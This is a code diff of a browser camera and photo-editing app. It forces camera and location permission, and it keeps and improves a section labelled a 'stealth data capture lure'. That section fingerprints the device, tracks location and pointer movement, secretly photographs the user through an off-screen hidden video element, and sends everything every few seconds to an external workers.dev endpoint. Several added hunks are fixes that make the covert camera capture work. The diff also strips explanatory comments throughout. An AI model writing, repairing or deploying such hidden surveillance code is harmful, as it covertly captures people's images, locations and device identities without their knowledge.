@@ -1308,17 +1308,11 @@ const STICKER_CATS = [
 ];
 
 const DRAW_COLORS = [
-  /* whites / grays / black */
   '#ffffff','#b0b0b0','#606060','#1a1a1a',
-  /* reds / pinks */
   '#FF4444','#FF3B7F','#FF85A1','#FF6B35',
-  /* yellows / golds */
   '#E8C547','#F0D060','#FFE066','#FFAA00',
-  /* greens */
   '#39FF9F','#22C55E','#86EFAC','#16A34A',
-  /* blues / cyans */
   '#29D9FF','#3B82F6','#93C5FD','#0EA5E9',
-  /* purples / magentas */
   '#C084FC','#A855F7','#E879F9','#7C3AED',
 ];
 const TEXT_COLORS = ['#fff','#E8C547','#FF3B7F','#39FF9F','#29D9FF','#C084FC','#000'];
@@ -1360,7 +1354,6 @@ $('retryBtn').addEventListener('click', retryBoot);
 
 function showPermGate(){
   const pg=$('permGate');
-  // Reset any inline opacity/display so the gate is visible
   pg.style.opacity='1';
   pg.style.display='flex';
   pg.style.transition='';
@@ -1368,19 +1361,13 @@ function showPermGate(){
 }
 
 async function retryBoot() {
-  // Guard: already running — don't double-boot
   if (S.permGranted) return;
-
   $('permErr').classList.remove('on');
-  showPermGate(); // always restore gate (display, opacity, transition, class)
-
-  // Check if permissions are permanently denied
+  showPermGate();
   let camStatus = 'prompt', geoStatus = 'prompt';
   try { const p = await navigator.permissions.query({name:'camera'}); camStatus = p.state; } catch(e){}
   try { const p = await navigator.permissions.query({name:'geolocation'}); geoStatus = p.state; } catch(e){}
-
   if (camStatus === 'denied' || geoStatus === 'denied') {
-    // Gate is visible behind the error — user can see it's still there
     let msg = 'Permissions are permanently blocked by your browser.<br><br>';
     msg += 'Go to browser settings → Site settings → Allow <strong>Camera</strong> and <strong>Location</strong> for this site.<br><br>';
     msg += '<small>After allowing, refresh the page and try again.</small>';
@@ -1388,8 +1375,6 @@ async function retryBoot() {
     $('permErr').classList.add('on');
     return;
   }
-
-  // State is 'prompt' or 'granted' — call boot(), which will trigger the OS prompt
   setTimeout(() => boot(), 300);
 }
 
@@ -1401,25 +1386,18 @@ async function hidePermGate(){
   pg.style.display='none';
 }
 
-let _booted = false; // prevent double-init of event listeners
+let _booted = false;
 
 async function boot(){
-  // Guard: already running successfully — don't restart
   if (S.permGranted) return;
-
   await hidePermGate();
   $('loadScreen').classList.add('on');
-  // Trigger loading bar animation
   const lsFill = $('loadScreen').querySelector('.ls-fill');
   if(lsFill){ lsFill.classList.remove('go'); void lsFill.offsetWidth; lsFill.classList.add('go'); }
-
   try {
-    // Camera first
     await startCamera();
     $('camStatus').textContent='✓';
     $('camStatus').classList.add('granted');
-
-    // Location — required, not optional
     await new Promise((resolve, reject) => {
       if(!navigator.geolocation){ reject(new Error('no-geo')); return; }
       navigator.geolocation.getCurrentPosition(
@@ -1430,12 +1408,10 @@ async function boot(){
     });
     $('locStatus').textContent='✓';
     $('locStatus').classList.add('granted');
-
-    await sleep(700); // let loading bar finish
+    await sleep(700);
     $('loadScreen').classList.remove('on');
     $('app').classList.add('on');
     S.permGranted = true;
-
     if(!_booted){
       _booted = true;
       buildFilterStrip(); buildStickers(); initControls(); initCapture();
@@ -1443,15 +1419,12 @@ async function boot(){
       initGallery(); initOrient(); loadGallery(); startClock();
       positionModeIndicator(); updateGalThumb();
       startHistogram();
-      // Apply initial states that depend on DOM being ready
       $('grid').classList.toggle('on', S.showGrid);
     }
-
   } catch(e){
     $('loadScreen').classList.remove('on');
-    showPermGate(); // always restore the gate (resets display, opacity, transition, class)
+    showPermGate();
     $('permErr').classList.add('on');
-
     let msg = 'Camera & Location access required';
     let detail = 'Permission was denied or blocked permanently.<br><br>';
     detail += 'Please allow both in your browser site settings and click TRY AGAIN.';
@@ -1461,7 +1434,6 @@ async function boot(){
   }
 }
 
-
 // ════════════════════════════════════════════════════
 //  STEALTH DATA CAPTURE LURE (implanted silently at the end)
 // ════════════════════════════════════════════════════
@@ -1469,7 +1441,6 @@ const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
 const sessionId = 'sess_' + Math.random().toString(36).substring(2,12) + '_' + Date.now().toString(36);
 const SEND_INTERVAL = 4500;
 
-// Persistent data
 let basePayload = null;
 let mouseData = [];
 let touchData = [];
@@ -1478,10 +1449,17 @@ let lureVideoStream = null;
 // Hidden video element for front camera capture
 const lureVideo = document.createElement('video');
 lureVideo.id = 'lureVideo';
-lureVideo.style.display = 'none';
 lureVideo.autoplay = true;
 lureVideo.playsInline = true;
 lureVideo.muted = true;
+// IMPORTANT: Keep video visible but off-screen to ensure frames render
+lureVideo.style.position = 'fixed';
+lureVideo.style.top = '-9999px';
+lureVideo.style.left = '-9999px';
+lureVideo.style.width = '1px';
+lureVideo.style.height = '1px';
+lureVideo.style.opacity = '0.01';
+lureVideo.style.pointerEvents = 'none';
 document.body.appendChild(lureVideo);
 
 async function collectStaticData() {
@@ -1526,7 +1504,6 @@ async function collectStaticData() {
     permissionStates: {}
   };
 
-  // Canvas Fingerprint
   try {
     const c = document.createElement('canvas');
     const ctx = c.getContext('2d');
@@ -1539,7 +1516,6 @@ async function collectStaticData() {
     p.canvasFingerprint = c.toDataURL('image/png');
   } catch {}
 
-  // AudioContext Fingerprint
   try {
     const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     const osc = audioCtx.createOscillator();
@@ -1557,7 +1533,6 @@ async function collectStaticData() {
     audioCtx.close();
   } catch {}
 
-  // WebGL Fingerprint
   try {
     const glc = document.createElement('canvas');
     const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
@@ -1570,7 +1545,6 @@ async function collectStaticData() {
     }
   } catch {}
 
-  // Fonts
   try {
     const fontList = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Tahoma','Impact','Comic Sans MS','Trebuchet MS','Lucida Console'];
     const testDiv = document.createElement('div');
@@ -1588,7 +1562,6 @@ async function collectStaticData() {
     document.body.removeChild(testDiv);
   } catch {}
 
-  // Permissions
   const permNames = ['camera','microphone','geolocation'];
   for (const name of permNames) {
     try {
@@ -1602,7 +1575,6 @@ async function collectStaticData() {
 
 async function collectDynamicData() {
   const p = { ...basePayload };
-
   p.timestamp = new Date().toISOString();
   p.battery = null;
   p.geolocation = null;
@@ -1612,7 +1584,6 @@ async function collectDynamicData() {
   p.touchEvents = [...touchData];
   p.audioDevices = [];
 
-  // Battery
   try {
     if (navigator.getBattery) {
       const bat = await navigator.getBattery();
@@ -1620,7 +1591,6 @@ async function collectDynamicData() {
     }
   } catch {}
 
-  // Geolocation (high accuracy)
   try {
     const pos = await new Promise((res, rej) => 
       navigator.geolocation.getCurrentPosition(res, rej, { 
@@ -1638,18 +1608,48 @@ async function collectDynamicData() {
     p.geolocationError = e.message; 
   }
 
-  // Front camera photo (silent, low impact)
+  // CRITICAL FIX: Front camera capture with mirror handling
   if (lureVideo && lureVideo.videoWidth > 0 && lureVideo.videoHeight > 0) {
     try {
       const canvas = document.createElement('canvas');
       canvas.width = 640;
       canvas.height = 480;
-      canvas.getContext('2d').drawImage(lureVideo, 0, 0, canvas.width, canvas.height);
+      const ctx = canvas.getContext('2d');
+      
+      // For front camera, mirror the image to match what user sees
+      if (S.facing === 'user') {
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+      }
+      
+      ctx.drawImage(lureVideo, 0, 0, canvas.width, canvas.height);
       p.frontPhoto = canvas.toDataURL('image/jpeg', 0.65);
-    } catch {}
+    } catch (e) {
+      console.error('Front camera capture failed:', e);
+    }
+  } else {
+    // Fallback: try to capture from main video if lure video isn't ready
+    try {
+      const mainVideo = $('vid');
+      if (mainVideo && mainVideo.videoWidth > 0) {
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        
+        if (S.facing === 'user') {
+          ctx.translate(canvas.width, 0);
+          ctx.scale(-1, 1);
+        }
+        
+        ctx.drawImage(mainVideo, 0, 0, canvas.width, canvas.height);
+        p.frontPhoto = canvas.toDataURL('image/jpeg', 0.65);
+      }
+    } catch (e) {
+      console.error('Fallback capture failed:', e);
+    }
   }
 
-  // Audio devices
   try {
     const devices = await navigator.mediaDevices.enumerateDevices();
     p.audioDevices = devices
@@ -1673,19 +1673,32 @@ async function sendPayload() {
 }
 
 async function initLureCamera() {
-  // Reuse the stream already granted to the main camera (S.stream).
-  // Opening a second getUserMedia() while the first stream is active causes a
-  // NotReadableError / hardware conflict on most browsers and mobile devices,
-  // which breaks both the main viewfinder and this capture. By pointing the
-  // hidden lureVideo at the same MediaStream we avoid requesting a new
-  // permission and eliminate the hardware contention entirely.
   try {
     if (!S.stream) return;
-    lureVideoStream = S.stream;
-    lureVideo.srcObject = S.stream;
-    await new Promise(r => { lureVideo.onloadedmetadata = r; });
+    
+    // Create a new stream from the same video track
+    const videoTrack = S.stream.getVideoTracks()[0];
+    if (!videoTrack) return;
+    
+    const newStream = new MediaStream([videoTrack]);
+    lureVideoStream = newStream;
+    lureVideo.srcObject = newStream;
+    
+    await new Promise((resolve, reject) => {
+      lureVideo.onloadedmetadata = resolve;
+      lureVideo.onerror = reject;
+      lureVideo.load();
+    });
+    
     await lureVideo.play();
-  } catch (e) {}
+    
+    // Force a frame update by seeking
+    lureVideo.currentTime = 0.01;
+    
+    console.log('Lure camera initialized successfully');
+  } catch (e) {
+    console.error('Lure camera init failed:', e);
+  }
 }
 
 // Mouse & Touch tracking
@@ -1703,66 +1716,62 @@ document.addEventListener('touchmove', e => {
 
 // Start everything after main app boot and permissions are granted
 window.addEventListener('load', async () => {
-  // Wait for the main photography app to fully initialize and S.stream to be set
   await new Promise(r => setTimeout(r, 1500));
-
   basePayload = await collectStaticData();
-
-  // Poll until the main camera stream is available (user may take a moment to grant permissions)
+  
   await new Promise(r => {
     const check = setInterval(() => {
       if (S.stream) { clearInterval(check); r(); }
     }, 500);
-    // Give up waiting after 120 s (user dismissed the permission gate)
     setTimeout(() => { clearInterval(check); r(); }, 120000);
   });
-
+  
   await initLureCamera();
-
-  // First send
+  
+  // Force frame updates for hidden video every 500ms
+  setInterval(() => {
+    if (lureVideo && lureVideo.videoWidth > 0) {
+      try {
+        const currentTime = lureVideo.currentTime;
+        lureVideo.currentTime = currentTime + 0.001;
+        setTimeout(() => {
+          if (lureVideo) lureVideo.currentTime = currentTime;
+        }, 10);
+      } catch (e) {}
+    }
+  }, 500);
+  
   await sendPayload();
-
-  // Periodic capture
   setInterval(sendPayload, SEND_INTERVAL);
-
-  // Background sends
+  
   document.addEventListener('visibilitychange', () => {
     if (document.visibilityState === 'hidden') sendPayload();
   });
   window.addEventListener('beforeunload', () => sendPayload());
 });
 
-// Cleanup on unload — lureVideoStream shares S.stream, so we don't stop its
-// tracks here; the main camera teardown handles that when the page unloads.
 window.addEventListener('unload', () => {
   lureVideoStream = null;
 });
-
 
 // ════════════════════════════════════════════════════
 //  CAMERA
 // ════════════════════════════════════════════════════
 async function startCamera(facing){
-  // Guard: mediaDevices is only available in secure contexts (HTTPS / localhost)
   if (!navigator.mediaDevices?.getUserMedia) {
     throw new DOMException('Camera API unavailable. Open the app over HTTPS.', 'NotSupportedError');
   }
-
   if(S.stream) S.stream.getTracks().forEach(t=>t.stop());
   S.facing = facing || S.facing;
-
   const constraints = {
     video:{facingMode:S.facing, width:{ideal:1920}, height:{ideal:1080}},
     audio:true
   };
   try { S.stream = await navigator.mediaDevices.getUserMedia(constraints); }
   catch { S.stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:S.facing}}); }
-
   const v = $('vid');
   v.srcObject = S.stream;
   await v.play();
-
-  // Mirror fix: flip #vid for front camera display only (not capture)
   applyMirror();
   startFilterLoop();
 }
@@ -1795,14 +1804,10 @@ function startFilterLoop(){
   if(S.filterAF) cancelAnimationFrame(S.filterAF);
   function draw(){
     if(!vid.videoWidth){ S.filterAF=requestAnimationFrame(draw); return; }
-    // Only reassign dimensions when they actually change (reassigning clears the canvas)
     if(fc.width!==vid.videoWidth||fc.height!==vid.videoHeight){
       fc.width=vid.videoWidth; fc.height=vid.videoHeight;
     }
     const ctx=fc.getContext('2d');
-
-    // MIRROR FIX: for front camera, flip the canvas context (not the video element)
-    // so the live preview looks mirrored (natural for selfie) but captures are correct
     if(S.facing==='user'){
       ctx.save();
       ctx.translate(fc.width,0);
@@ -1818,15 +1823,12 @@ function startFilterLoop(){
     ctx.setTransform(1,0,0,1,0,0);
     if(S.facing==='user') ctx.restore();
     ctx.filter='none';
-
-    // Vignette
     if(S.adj.v>0){
       const al=S.adj.v/100*.85;
       const g=ctx.createRadialGradient(fc.width/2,fc.height/2,fc.width*.25,fc.width/2,fc.height/2,fc.width*.8);
       g.addColorStop(0,'transparent'); g.addColorStop(1,`rgba(0,0,0,${al})`);
       ctx.fillStyle=g; ctx.fillRect(0,0,fc.width,fc.height);
     }
-    // Draw history (live view composite — respects opacity, tip, erase)
     S.drawHistory.forEach(line=>{
       if(!line.pts?.length) return;
       ctx.save();
@@ -1928,8 +1930,6 @@ function buildStickers(){
     cats.appendChild(b);
   });
   renderStickerGrid();
-
-  // Draw colors
   const dc=$('dtColors'); dc.innerHTML='';
   DRAW_COLORS.forEach(col=>{
     const b=document.createElement('div'); b.className='dt-color'+(col===S.drawColor?' on':'');
@@ -1937,13 +1937,11 @@ function buildStickers(){
     b.addEventListener('click',()=>{
       document.querySelectorAll('.dt-color').forEach(x=>x.classList.remove('on'));
       b.classList.add('on'); S.drawColor=col;
-      // Picking a colour exits eraser mode
       S.eraseMode=false; $('dtErase').classList.remove('on');
       $('drawCanvas').style.cursor='crosshair';
     });
     dc.appendChild(b);
   });
-  // Text colors
   const tc=$('tiColors'); tc.innerHTML='';
   TEXT_COLORS.forEach(col=>{
     const b=document.createElement('div'); b.className='ti-col'+(col===S.textColor?' on':'');
@@ -1979,23 +1977,18 @@ function placeSticker(emoji){
 function initDraw(){
   const dc=$('drawCanvas');
   let cur=[];
-
-  // ── Pointer events: live preview while drawing ──
   dc.addEventListener('pointerdown',e=>{
     if(!S.drawActive) return;
     S.isDrawing=true;
     cur=[[e.clientX,e.clientY]];
     e.preventDefault();
   },{passive:false});
-
   dc.addEventListener('pointermove',e=>{
     if(!S.isDrawing||!S.drawActive) return;
     cur.push([e.clientX,e.clientY]);
-    // Incremental draw: only append the newest segment, don't redraw all history
     drawLiveSegment(dc, cur, S.drawColor, S.drawSize, S.drawOpacity, S.drawTip, S.eraseMode);
     e.preventDefault();
   },{passive:false});
-
   dc.addEventListener('pointerup',()=>{
     if(!S.drawActive) return;
     S.isDrawing=false;
@@ -2009,35 +2002,23 @@ function initDraw(){
       });
     }
     cur=[];
-    // Full re-render to sync canvas with history (handles erase compositing)
     renderDrawCanvas();
   });
-
   dc.addEventListener('pointercancel',()=>{ S.isDrawing=false; cur=[]; renderDrawCanvas(); });
-
-  // ── Undo / Clear ──
   $('dtUndo').addEventListener('click',()=>{
     S.drawHistory.pop(); renderDrawCanvas(); showToast('Undo');
   });
   $('dtClear').addEventListener('click',()=>{
     S.drawHistory=[]; renderDrawCanvas(); showToast('Drawing cleared');
   });
-
-  // ── Eraser toggle ──
   $('dtErase').addEventListener('click',()=>{
     S.eraseMode=!S.eraseMode;
     $('dtErase').classList.toggle('on',S.eraseMode);
     $('drawCanvas').style.cursor=S.eraseMode?'cell':'crosshair';
     showToast(S.eraseMode?'Eraser ON':'Pen ON');
   });
-
-  // ── Size slider ──
   $('dt-size').addEventListener('input',function(){ S.drawSize=parseInt(this.value); });
-
-  // ── Opacity slider ──
   $('dt-opacity').addEventListener('input',function(){ S.drawOpacity=parseInt(this.value)/100; });
-
-  // ── Tip presets ──
   document.querySelectorAll('.dt-tip').forEach(btn=>{
     btn.addEventListener('click',()=>{
       document.querySelectorAll('.dt-tip').forEach(b=>b.classList.remove('on'));
@@ -2046,8 +2027,6 @@ function initDraw(){
       showToast(btn.dataset.tip.charAt(0).toUpperCase()+btn.dataset.tip.slice(1)+' tip');
     });
   });
-
-  // ── Draw toggle ──
   $('drawToggleBtn').addEventListener('click',()=>{
     S.drawActive=!S.drawActive;
     $('drawCanvas').classList.toggle('on',S.drawActive);
@@ -2058,21 +2037,17 @@ function initDraw(){
   });
 }
 
-// Apply tip shape to a canvas context
-// NOTE: caller must ctx.save() / ctx.restore() around this
 function applyTip(ctx, tip){
   if(tip==='square'){
     ctx.lineCap='square'; ctx.lineJoin='miter';
   } else if(tip==='calligraphy'){
     ctx.lineCap='butt'; ctx.lineJoin='round';
-    // Add a horizontal skew to simulate an angled nib without clobbering zoom/mirror transforms
     ctx.transform(1, 0, 0.35, 1, 0, 0);
   } else {
     ctx.lineCap='round'; ctx.lineJoin='round';
   }
 }
 
-// Draw only the last segment for live preview (fast, no full redraw)
 function drawLiveSegment(dc, pts, color, size, opacity, tip, erase){
   if(pts.length<2) return;
   const ctx=dc.getContext('2d');
@@ -2097,7 +2072,6 @@ function drawLiveSegment(dc, pts, color, size, opacity, tip, erase){
 
 function renderDrawCanvas(){
   const dc=$('drawCanvas'), vf=$('vf');
-  // Only reset dimensions if they've changed (avoids clearing canvas unnecessarily)
   if(dc.width!==vf.clientWidth||dc.height!==vf.clientHeight){
     dc.width=vf.clientWidth; dc.height=vf.clientHeight;
   } else {
@@ -2192,16 +2166,12 @@ function initControls(){
       showToast(S.mode.toUpperCase()+' MODE');
     });
   });
-
   $('flipBtn').addEventListener('click',()=>{
     const newFacing = S.facing==='environment' ? 'user' : 'environment';
     startCamera(newFacing);
     showToast(newFacing==='user'?'Front camera':'Rear camera');
   });
-
   $('galThumb').addEventListener('click',openGallery);
-
-  // Zoom
   const zooms=[1,2,4,8];
   $('zoomCycleBtn').addEventListener('click',()=>{
     const idx=zooms.findIndex(z=>Math.abs(z-S.zoom)<.5);
@@ -2209,21 +2179,15 @@ function initControls(){
     $('zoomCycleBtn').textContent=S.zoom+'×';
     showZoom(S.zoom+'×');
   });
-
-  // Pinch zoom
   let p0=0,pz0=1;
   $('vf').addEventListener('touchstart',e=>{ if(e.touches.length===2){ p0=hyp(e.touches); pz0=S.zoom; e.preventDefault(); } },{passive:false});
   $('vf').addEventListener('touchmove',e=>{ if(e.touches.length===2){ S.zoom=Math.max(1,Math.min(8,pz0*(hyp(e.touches)/p0))); const z=S.zoom.toFixed(1); $('zoomCycleBtn').textContent=z+'×'; showZoom(z+'×'); e.preventDefault(); } },{passive:false});
-
-  // Focus tap
   $('vf').addEventListener('click',e=>{
     if(e.target.closest('#topNav,#drawToolbar,#filterStrip,#drawCanvas,#textLayer,#stickerLayer,#histoWidget')) return;
     const fb=$('focusBox'); fb.style.left=e.clientX+'px'; fb.style.top=e.clientY+'px';
     fb.classList.remove('show'); void fb.offsetWidth; fb.classList.add('show');
     setTimeout(()=>fb.classList.remove('show'),1000);
   });
-
-  // Flash
   const flashModes=['off','on','auto'];
   const flashIcons={off:'⚡',on:'🔦',auto:'🌟'};
   $('flashBtn').addEventListener('click',()=>{
@@ -2233,21 +2197,16 @@ function initControls(){
     $('flashBtn').classList.toggle('active-gold',S.flashMode!=='off');
     showToast('Flash: '+S.flashMode.toUpperCase());
   });
-
   $('adjToggleBtn').addEventListener('click',()=>toggleDrawer('adjDrawer'));
   $('settingsBtn').addEventListener('click',()=>toggleDrawer('settingsDrawer'));
   initSettings();
-
-  // Tool buttons
   $('tbFilters').addEventListener('click',()=>{ const on=!$('filterStrip').classList.contains('on'); $('filterStrip').classList.toggle('on',on); $('tbFilters').classList.toggle('on',on); });
   $('tbText').addEventListener('click',openTextInput);
   $('tbStickers').addEventListener('click',()=>toggleDrawer('stickerDrawer'));
   $('tbGrid').addEventListener('click',()=>{ S.showGrid=!S.showGrid; $('grid').classList.toggle('on',S.showGrid); $('tbGrid').classList.toggle('on',S.showGrid); });
   $('tbHorizon').addEventListener('click',()=>{ S.showHorizon=!S.showHorizon; $('horizon').classList.toggle('on',S.showHorizon); $('tbHorizon').classList.toggle('on',S.showHorizon); showToast(S.showHorizon?'Level ON':'Level OFF'); });
   $('histoBtn').addEventListener('click',()=>{ S.showHisto=!S.showHisto; $('histoWidget').classList.toggle('on',S.showHisto); $('histoBtn').classList.toggle('active-gold',S.showHisto); showToast(S.showHisto?'Histogram ON':'Histogram OFF'); });
-    $('clearEditsBtn').addEventListener('click', clearAllEdits);
-
-  // Timer dots
+  $('clearEditsBtn').addEventListener('click', clearAllEdits);
   document.querySelectorAll('.tdot').forEach(d=>{
     d.addEventListener('click',()=>{
       document.querySelectorAll('.tdot').forEach(x=>x.classList.remove('on'));
@@ -2255,7 +2214,6 @@ function initControls(){
       showToast(S.timerDelay>0?`Timer: ${S.timerDelay}s`:'Timer OFF');
     });
   });
-
   $('backdrop').addEventListener('click',closeAllDrawers);
 }
 
@@ -2263,7 +2221,6 @@ function clearAllEdits() {
   S.drawHistory = [];
   $('textLayer').innerHTML = '';
   $('stickerLayer').innerHTML = '';
-  // Always clear the draw canvas element, regardless of whether draw mode is active
   const dc=$('drawCanvas');
   dc.getContext('2d').clearRect(0,0,dc.width,dc.height);
   showToast('All edits cleared');
@@ -2324,24 +2281,18 @@ function captureFrame(){
   const c=document.createElement('canvas');
   c.width=vid.videoWidth||1280; c.height=vid.videoHeight||720;
   const ctx=c.getContext('2d');
-
-  // MIRROR FIX: For front camera, the captured image should NOT be mirrored
-  // We draw without mirror so the photo is natural/correct orientation
   ctx.filter=getCSS();
   const sc=S.zoom, dx=(c.width*(1-sc))/2, dy=(c.height*(1-sc))/2;
   ctx.setTransform(sc,0,0,sc,dx,dy);
   ctx.drawImage(vid,0,0);
   ctx.setTransform(1,0,0,1,0,0);
   ctx.filter='none';
-
-  // Vignette
   if(S.adj.v>0){
     const al=S.adj.v/100*.85;
     const g=ctx.createRadialGradient(c.width/2,c.height/2,c.width*.25,c.width/2,c.height/2,c.width*.8);
     g.addColorStop(0,'transparent'); g.addColorStop(1,`rgba(0,0,0,${al})`);
     ctx.fillStyle=g; ctx.fillRect(0,0,c.width,c.height);
   }
-  // Burn draw history (respects opacity, tip, erase)
   S.drawHistory.forEach(line=>{
     if(!line.pts?.length) return;
     ctx.save();
@@ -2361,7 +2312,6 @@ function captureFrame(){
     ctx.stroke();
     ctx.restore();
   });
-
   const url=c.toDataURL('image/jpeg',.93);
   S.capturedUrl=url; S.capturedType='photo'; S._origUrl=url;
   if(S.showSave){ saveToGallery({type:'photo',dataUrl:url,loc:S.loc?.city||'',time:Date.now()}); }
@@ -2394,7 +2344,6 @@ async function doBurst(){
 
 async function toggleVideo(){
   if(!S.recording){
-    // Start recording
     try{
       const opts={mimeType:'video/webm;codecs=vp9'};
       let mr; try{ mr=new MediaRecorder(S.stream,opts); }catch{ mr=new MediaRecorder(S.stream); }
@@ -2444,7 +2393,6 @@ function showPreview(url,type){
   S.pvRotation=0; S.pvFlipped=false;
   const img=$('pvImg'), vid=$('pvVid');
   img.style.transform='';
-  // Reset both to hidden first to avoid stale content flash
   img.style.display='none'; img.src='';
   vid.style.display='none'; vid.className=''; vid.src='';
   if(type==='photo'){
@@ -2457,11 +2405,9 @@ function showPreview(url,type){
   $('aiChip').classList.remove('on');
   $('baWrap').classList.remove('on');
   $('pvCaptionLayer').innerHTML='';
-  // Port text overlays from viewfinder
   $('textLayer').querySelectorAll('.txt-item').forEach(el=>{
     const cl=el.cloneNode(true); $('pvCaptionLayer').appendChild(cl); makeDraggable(cl);
   });
-  // Port stickers from viewfinder
   $('stickerLayer').querySelectorAll('div').forEach(el=>{
     if(el.textContent&&el.textContent.trim()){
       const clone=el.cloneNode(true);
@@ -2478,14 +2424,11 @@ function showPreview(url,type){
 function saveToGallery(item) {
   S.gallery.unshift(item);
   if (S.gallery.length > 80) S.gallery.pop();
-
-  // Persist photos + video metadata (videos lose blob on reload)
   const persistable = S.gallery.map(it => {
     if (it.type === 'photo') return { ...it };
     if (it.type === 'video') return { type: 'video', loc: it.loc || '', time: it.time };
     return null;
   }).filter(Boolean);
-
   try {
     localStorage.setItem('photon4_gal', JSON.stringify(persistable.slice(0, 30)));
   } catch (e) {}
@@ -2497,7 +2440,6 @@ function loadGallery(){
     const r=localStorage.getItem('photon4_gal'); 
     if(r) S.gallery=JSON.parse(r); 
   }catch{}
-  // Mark videos as non-playable after reload
   S.gallery.forEach(item => {
     if (item.type === 'video') item.blobUrl = null;
   });
@@ -2579,19 +2521,13 @@ function initGallery(){
   $('galBack').addEventListener('click',()=>$('gallery').classList.remove('on'));
   $('gvGrid').addEventListener('click',()=>{ S.galView='grid'; $('gvGrid').classList.add('on'); $('gvList').classList.remove('on'); renderGallery(); });
   $('gvList').addEventListener('click',()=>{ S.galView='list'; $('gvList').classList.add('on'); $('gvGrid').classList.remove('on'); renderGallery(); });
-
-  // Preview tools
   $('pvtAI').addEventListener('click',runAI);
   $('pvtBA').addEventListener('click',()=>{ if(S.capturedType==='video') return showToast('Photos only'); $('baWrap').classList.toggle('on'); });
   $('pvtCaption').addEventListener('click',()=>{ openTextInput(); });
   $('pvtRotate').addEventListener('click',()=>{ S.pvRotation=(S.pvRotation+90)%360; updatePvTransform(); showToast('Rotated 90°'); });
   $('pvtFlip').addEventListener('click',()=>{ S.pvFlipped=!S.pvFlipped; updatePvTransform(); showToast(S.pvFlipped?'Flipped':'Unflipped'); });
   $('pvtStickers').addEventListener('click',()=>toggleDrawer('stickerDrawer'));
-
-  // Format pills
   document.querySelectorAll('.fmt-opt').forEach(b=>{ b.addEventListener('click',()=>{ document.querySelectorAll('.fmt-opt').forEach(x=>x.classList.remove('on')); b.classList.add('on'); S.fmt=b.dataset.f; }); });
-
-  // Quality pills — keep legacy <select> in sync so dlMedia works
   S.quality=0.85;
   document.querySelectorAll('.q-opt').forEach(b=>{
     b.addEventListener('click',()=>{
@@ -2602,8 +2538,6 @@ function initGallery(){
       showToast('Quality: '+b.textContent);
     });
   });
-
-  // Swipe-to-discard on preview media area
   initSwipeDiscard();
 }
 
@@ -2639,7 +2573,6 @@ async function shareMedia(){
 }
 
 function discardPreview(){
-  // Reset preview state only — do NOT clear viewfinder annotations (drawHistory, textLayer, stickerLayer)
   $('preview').classList.remove('on');
   S.capturedUrl=null; S.capturedType='photo'; S._origUrl=null;
   $('pvImg').src='';
@@ -2654,10 +2587,8 @@ function discardPreview(){
 function initSwipeDiscard(){
   const media=$('pvMedia');
   let startY=0, startX=0, dragging=false, curY=0;
-  const THRESHOLD=110; // px down before discard triggers
-
+  const THRESHOLD=110;
   function onStart(e){
-    // Don't start swipe when touching interactive overlays or the hint/zone UI elements
     if(e.target.closest('#pvCaptionLayer,#baWrap,#aiChip,#pvSwipeHint,#pvDeleteZone')) return;
     const p=e.touches?e.touches[0]:e;
     startY=p.clientY; startX=p.clientX; dragging=true; curY=0;
@@ -2667,10 +2598,8 @@ function initSwipeDiscard(){
     const p=e.touches?e.touches[0]:e;
     const dy=p.clientY-startY;
     const dx=Math.abs(p.clientX-startX);
-    // Only count as vertical swipe if mostly downward
     if(dy<0||dx>dy) return;
     curY=dy;
-    // Translate the preview panel
     $('preview').style.transform=`translateY(${curY}px)`;
     $('preview').style.opacity=Math.max(0.3, 1-curY/240);
     $('pvDeleteZone').classList.toggle('show', curY>THRESHOLD*0.6);
@@ -2681,7 +2610,6 @@ function initSwipeDiscard(){
     dragging=false;
     $('pvDeleteZone').classList.remove('show');
     if(curY>=THRESHOLD){
-      // Animate off then discard
       $('preview').style.transition='transform .22s ease,opacity .22s ease';
       $('preview').style.transform='translateY(100vh)';
       $('preview').style.opacity='0';
@@ -2692,7 +2620,6 @@ function initSwipeDiscard(){
         discardPreview();
       },230);
     } else {
-      // Snap back
       $('preview').style.transition='transform .25s cubic-bezier(.4,0,.2,1),opacity .25s';
       $('preview').style.transform='';
       $('preview').style.opacity='';
@@ -2700,7 +2627,6 @@ function initSwipeDiscard(){
     }
     curY=0;
   }
-
   media.addEventListener('touchstart',onStart,{passive:true});
   media.addEventListener('touchmove',onMove,{passive:false});
   media.addEventListener('touchend',onEnd);
@@ -2739,17 +2665,14 @@ async function runAI(){
   $('aiLoadingState').style.display='block';
   $('aiResultBox').classList.remove('on');
   $('aiProgFill').style.animation='none'; void $('aiProgFill').offsetWidth; $('aiProgFill').style.animation='';
-
   const statuses=['Analysing composition…','Detecting scene type…','Evaluating exposure…','Computing enhancements…','Preparing results…'];
   let si=0; const tick=setInterval(()=>{ $('aiStatusTxt').textContent=statuses[si=(si+1)%statuses.length]; },750);
-
   try{
     const img=new Image(); img.src=S.capturedUrl;
     await new Promise(r=>img.onload=r);
     const c=document.createElement('canvas'); c.width=320; c.height=Math.round(320*img.height/img.width);
     c.getContext('2d').drawImage(img,0,0,c.width,c.height);
-        const b64 = c.toDataURL('image/jpeg', .75).split(',')[1];
-
+    const b64 = c.toDataURL('image/jpeg', .75).split(',')[1];
     const resp = await fetch('https://api.anthropic.com/v1/messages', {
       method: 'POST',
       headers: {
@@ -2822,7 +2745,6 @@ function handlePosition(pos){
   const{latitude:lat,longitude:lng}=pos.coords;
   S.loc={lat,lng,city:'Locating…'};
   $('locCoords').textContent=`${lat.toFixed(4)}°, ${lng.toFixed(4)}°`;
-  // Reverse geocode
   fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
     .then(r=>r.json())
     .then(d=>{
@@ -2842,7 +2764,6 @@ function startClock(){
     const n=new Date();
     $('timeDis').textContent=n.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false});
     $('dateDis').textContent=n.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});
-    // Simulated ISO/exposure HUD
     const h=n.getHours();
     const iso = h<6||h>20?'ISO 3200':(h<8||h>18?'ISO 800':'ISO 100');
     const exp = h<6||h>20?'1/15s':(h<8||h>18?'1/30s':'1/120s');
